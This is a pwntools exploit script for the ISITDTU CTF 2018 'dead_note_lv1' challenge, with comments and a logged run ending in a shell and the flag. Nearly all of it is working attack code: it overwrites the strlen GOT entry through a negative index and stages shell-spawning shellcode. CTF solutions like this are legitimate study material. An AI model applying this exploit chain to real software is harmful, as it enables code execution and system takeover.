#!/usr/bin/env python

"""
This solution was based a bit on different writeup:
https://github.com/AnisBoss/CTFs/blob/master/ISITDTU%20CTF%202018%20Quals/deadnote_lvl1-PWN/solve.py

but I have managed to find my own solution.

(I haven't touched this task during the CTF)
"""

# encoding: utf-8
from pwn import *

# FILL binary and host, port
binary = './dead_note_lv1'
host, port = '159.89.197.67 3333'.split(' ')
port = int(port)

e = ELF(binary)
context.os = 'linux'
context.arch = e.arch

if args['REMOTE']:
    p = remote(host, port)
elif args['GDB']:
    p = gdb.debug(binary, gdbscript='breakrva 0xE7D') # break at call strlen
else:
    p = process(binary)


def del_note(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index: ', str(index))

def add_note(index, payload, notes_number=1):
    assert(len(payload) <= 8), 'Payload too long; it is %r (len=%d)' % (payload, len(payload))
    print 'Sending payload = %r (len %d)' % (payload, len(payload))
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Number of Note: ', str(notes_number))
    p.sendlineafter('Content: ', payload)


# We can change .got.plt strlen entry to point to our own code
# this can be executed bcoz there is no NX bit
# and so we can +- craft a shellcode with it

notes_addr = 0x2020E0
strlen_got_plt = 0x0202028

strlen_got_plt_index = (strlen_got_plt - notes_addr) / 8
print 'strlen got plt index = %d' % strlen_got_plt_index

# Normally, strlen will be called to check if note content is shorter than 3 bytes
# We change got[strlen] so it does `xor eax, eax; ret` - this will make it return 0 all the time
# and thx to that we can use all 8 bytes instead of 3.

print "Strlen changed to xor eax, eax; ret"
add_note(strlen_got_plt_index, asm('xor eax, eax; ret'))

# This note add will use previous strlen so it returns 0 [so we can use all 8 bytes]
# So what do we do here? Because we can put ONLY 8 bytes, it would be nice to do 
# `read(0, buf, 50)` or something like this
#
# to do this, we need  to set:
# RAX = 0 <-- syscall number for x64 arch
# RDX = count = 50
# RSI = buf
# RDI = fd = stdin = 0
# execute syscall
#
# It turns out RSI points to stack memory already, so we don't need to set it
#
# So we overwrite got[strlen] so it calls the asm below (set count=50, fd=0 below and jump to RAX)
add_note(strlen_got_plt_index, asm('add rdx, 50; xor edi, edi; jmp rax'))

# So this note add: will execute the code above and make JMP RAX at the end
# The jmp rax stores the pointer to the `note content` buffer, which we set to the code below:
add_note(1, asm('xor eax, eax; syscall'))

# ^ and this code sets RAX=0 (syscall number for SYS_READ) and executes this syscall

# Normally, I wanted to put `jmp rsi` afterwards. But it turns out the buffer we save into (RSI)
# points to RAX-2
#
# so when I just did `p.sendline(asm(amd64.sh()))` the program crashed with SIGILL
# it was because I overwritten the code after `syscall` with the `read`.
#
# So I need to put the two bytes that were there, so the `sh` shellcode is after the syscall
# (and that's why I assemble `xor eax, eax; syscall` again below):
p.sendline(asm('xor eax, eax; syscall;' + shellcraft.amd64.sh()))

p.interactive()



"""
p solve.py REMOTE
[*] './dead_note_lv1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 159.89.197.67 on port 3333: Done
strlen got plt index = -23
Strlen changed to xor eax, eax; ret
Sending payload = '1\xc0\xc3' (len 3)
Sending payload = 'H\x83\xc221\xff\xff\xe0' (len 8)
Sending payload = '1\xc0\x0f\x05' (len 4)
[*] Switching to interactive mode
$ cat /home/dead_note_lv1/flag
ISITDTU{756d6e4267751936c6b045ae7bbfc26f}$
"""
